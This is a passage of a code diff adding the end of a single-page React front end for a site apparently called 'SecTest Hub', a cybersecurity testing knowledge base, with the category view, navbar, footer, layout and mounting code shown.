+                                className: 'text-[#4a5a5a] text-sm hover:text-[#8a9aa8] mb-1',
+                                onClick: navigateToHome
+                            }, '← All Categories'),
+                            React.createElement('h1', { className: 'text-xl md:text-2xl font-bold text-[#e8edf2]' },
+                                selectedCategory
+                            ),
+                            React.createElement('p', { className: 'text-[#7a8a8a] text-sm mt-0.5' },
+                                catData.description || `${catData.testCases.length} test case${catData.testCases.length > 1 ? 's' : ''}`
+                            )
+                        ),
+                        React.createElement('span', { className: 'text-[#4a5a5a] text-sm' },
+                            `${catData.testCases.length} test${catData.testCases.length > 1 ? 's' : ''}`
+                        )
+                    ),
+                    React.createElement('div', { key: 'search-filter', className: 'mb-4' },
+                        React.createElement(SearchBar, null)
+                    ),
+                    React.createElement(FilterPanel, { key: 'filters' }),
+                    React.createElement(TestCaseList, { key: 'list' })
+                ]);
+            }
+
+            if (currentView === 'test') {
+                return React.createElement(TestCaseDetail, null);
+            }
+
+            return null;
+        };
+
+        // --- Navbar ---
+        const Navbar = () => {
+            const { setSidebarOpen, sidebarOpen, navigateToHome } = useApp();
+
+            return React.createElement('nav', { className: 'glass fixed top-0 left-0 right-0 z-30 h-14 flex items-center px-3 md:px-6' }, [
+                // Mobile menu toggle
+                React.createElement('button', {
+                    key: 'menu',
+                    className: 'mobile-menu-btn md:hidden',
+                    onClick: () => setSidebarOpen(!sidebarOpen),
+                    'aria-label': 'Toggle sidebar'
+                }, Icon({ name: 'menu', size: 20 })),
+                // Logo
+                React.createElement('div', { key: 'logo', className: 'flex items-center gap-2 ml-1 md:ml-0 cursor-pointer',
+                        onClick: navigateToHome },
+                    React.createElement('div', { className: 'w-7 h-7 rounded-lg bg-[#00d4aa]/10 flex items-center justify-center text-[#00d4aa] font-bold text-xs' },
+                        'SH'
+                    ),
+                    React.createElement('div', null,
+                        React.createElement('span', { className: 'text-[#e8edf2] font-semibold text-sm tracking-tight' },
+                            'SecTest Hub'
+                        ),
+                        React.createElement('span', { className: 'hidden sm:inline text-[#4a5a5a] text-[0.55rem] ml-1.5 uppercase tracking-wider' },
+                            'Cybersecurity Testing Knowledge Base'
+                        )
+                    )
+                ),
+                // Search - centered
+                React.createElement('div', { key: 'search', className: 'hidden md:block flex-1 max-w-md mx-4' },
+                    React.createElement(SearchBar, null)
+                ),
+                // Right actions
+                React.createElement('div', { key: 'actions', className: 'flex items-center gap-1 ml-auto' },
+                    React.createElement('a', {
+                        href: 'https://github.com',
+                        target: '_blank',
+                        rel: 'noopener noreferrer',
+                        className: 'p-1.5 rounded-lg text-[#4a5a5a] hover:text-[#8a9aa8] hover:bg-[rgba(255,255,255,0.03)] transition'
+                    }, Icon({ name: 'github', size: 18 })),
+                    React.createElement('button', {
+                        className: 'p-1.5 rounded-lg text-[#4a5a5a] hover:text-[#8a9aa8] hover:bg-[rgba(255,255,255,0.03)] transition text-xs font-medium',
+                        onClick: () => { /* about */ }
+                    }, 'About')
+                )
+            ]);
+        };
+
+        // --- Footer ---
+        const Footer = () => {
+            return React.createElement('footer', { className: 'border-t border-[rgba(0,212,170,0.04)] py-4 px-6 mt-8' }, [
+                React.createElement('div', { key: 'inner', className: 'max-w-7xl mx-auto flex flex-col sm:flex-row items-center justify-between gap-2 text-[#4a5a5a] text-xs' },
+                    React.createElement('span', null, 'SecTest Hub — Cybersecurity Testing Knowledge Base'),
+                    React.createElement('div', { className: 'flex items-center gap-4' },
+                        React.createElement('a', { href: '#', className: 'hover:text-[#8a9aa8] transition' }, 'GitHub'),
+                        React.createElement('a', { href: '#', className: 'hover:text-[#8a9aa8] transition' },
+                            'Documentation'),
+                        React.createElement('a', { href: '#', className: 'hover:text-[#8a9aa8] transition' }, 'About'),
+                        React.createElement('a', { href: '#', className: 'hover:text-[#8a9aa8] transition' }, 'Privacy')
+                    )
+                )
+            ]);
+        };
+
+        // --- App ---
+        const App = () => {
+            const { sidebarOpen, setSidebarOpen } = useApp();
+
+            // Close sidebar on escape
+            useEffect(() => {
+                const handler = (e) => {
+                    if (e.key === 'Escape' && sidebarOpen) setSidebarOpen(false);
+                };
+                document.addEventListener('keydown', handler);
+                return () => document.removeEventListener('keydown', handler);
+            }, [sidebarOpen, setSidebarOpen]);
+
+            // Body class for sidebar
+            useEffect(() => {
+                if (sidebarOpen) {
+                    document.body.classList.add('sidebar-mobile-open');
+                } else {
+                    document.body.classList.remove('sidebar-mobile-open');
+                }
+                return () => document.body.classList.remove('sidebar-mobile-open');
+            }, [sidebarOpen]);
+
+            return React.createElement('div', { className: 'min-h-screen bg-[#0a0a0a]' }, [
+                React.createElement(Navbar, { key: 'navbar' }),
+                // Sidebar overlay
+                React.createElement('div', {
+                    key: 'overlay',
+                    className: `sidebar-overlay ${sidebarOpen ? 'open' : ''}`,
+                    onClick: () => setSidebarOpen(false)
+                }),
+                // Main layout
+                React.createElement('div', { key: 'layout', className: 'flex pt-14' }, [
+                    // Sidebar - desktop
+                    React.createElement('div', { key: 'sidebar', className: 'sidebar-desktop w-72 flex-shrink-0 h-[calc(100vh-3.5rem)] sticky top-14' },
+                        React.createElement(Sidebar, null)
+                    ),
+                    // Main content
+                    React.createElement('main', { key: 'main', className: 'flex-1 min-w-0 p-4 md:p-6 max-w-5xl mx-auto w-full' },
+                        React.createElement(MainContent, null),
+                        React.createElement(Footer, null)
+                    )
+                ])
+            ]);
+        };
+
+        // --- Mount ---
+        const rootEl = document.getElementById('root');
+        const root = ReactDOM.createRoot(rootEl);
+        root.render(
+            React.createElement(AppProvider, null,
+                React.createElement(App, null)
+            )
+        );
+    </script>
+</body>
+</html>
